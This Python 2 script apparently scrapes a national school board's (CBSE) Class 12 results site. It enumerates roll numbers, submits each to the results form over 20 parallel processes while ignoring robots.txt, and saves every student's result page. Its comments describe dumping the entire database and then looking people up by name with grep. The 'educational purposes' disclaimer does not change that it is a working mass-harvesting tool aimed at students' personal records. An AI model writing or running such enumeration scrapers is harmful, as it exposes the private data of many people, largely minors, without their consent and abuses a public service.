#!/usr/bin/python

# Disclaimer: This script is only for educational purposes.
# Please use this at your own risk.
# Author: jsinix(jsinix.1337@gmail.com) 

# This script runs to grab results of all the roll numbers 
# range passed as a range. This can be used to dump all the 
# possible roll numbers possible. There is just one that is 
# done on the client side if the roll numbers are valid or 
# not are to check the first two digits of the roll number. 
# If you view the source of the page you will notice that 
# the valid roll numbers start with 16, 17, ..... 99. So 
# you can start with that.
# Once the entire database id dumped, you can reverse search
# someone's details by just the name by 'grep' etc if you do
# not know someone's roll number.
# In addition to that, this script uses parallel processing
# to send multiple requests simultaniously to save time.

import mechanize
from multiprocessing import Pool

def result_grabber(rollx):
    rollx = str(rollx)
    print "Getting the result of roll# %s" % rollx
    url = "http://cbseresults.nic.in/class12/cbse122014_total.htm"
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.open(url)
    br.select_form(name="FrontPage_Form1")
    br["regno"] = rollx
    res = br.submit()
    content = res.read()
    fname = rollx+".html"
    with open(fname, "w") as f:
        f.write(content)

if __name__ == '__main__':
    pool = Pool(processes=20)
    input1 = range(1600000,1600100)
    try:
        result = pool.map(result_grabber, input1)
    except:
        print "Error processing roll# %s" % input1
